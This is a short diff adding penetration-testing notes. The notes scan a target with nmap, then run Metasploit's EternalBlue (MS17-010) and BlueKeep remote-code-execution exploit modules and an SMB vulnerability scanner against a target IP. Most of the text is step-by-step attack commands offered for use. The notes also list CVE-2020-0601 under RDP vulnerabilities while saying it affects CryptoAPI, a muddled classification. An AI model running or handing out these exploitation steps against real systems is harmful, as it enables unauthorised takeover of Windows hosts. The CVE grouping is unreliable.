@@ -1,0 +1,26 @@
+
+I]  Identifying Exposed Services and Open Ports:
+
+#nmap -sV --version-all -p <port_number> <target-ip>
+_______________________________________________________________________________________
+II]  Search for Known Vulnerabilities:
+1)EternalBlue (CVE-2017-0144) affecting SMB.
+2)BlueKeep (CVE-2019-0708) affecting RDP.
+3)RDP vulnerabilities (CVE-2020-0601) affecting the CryptoAPI.
+
+#msfconsole
+1)
+>use exploit/windows/smb/ms17_010_eternalblue
+>set RHOSTS <target_ip>
+>set RPORT 445
+>run
+
+2)
+>use auxiliary/scanner/smb/smb_ms17_010
+>auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS <target_ip>
+>auxiliary(scanner/smb/smb_ms17_010) > run
+
+3)
+>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+>exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.33.100
+>exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run
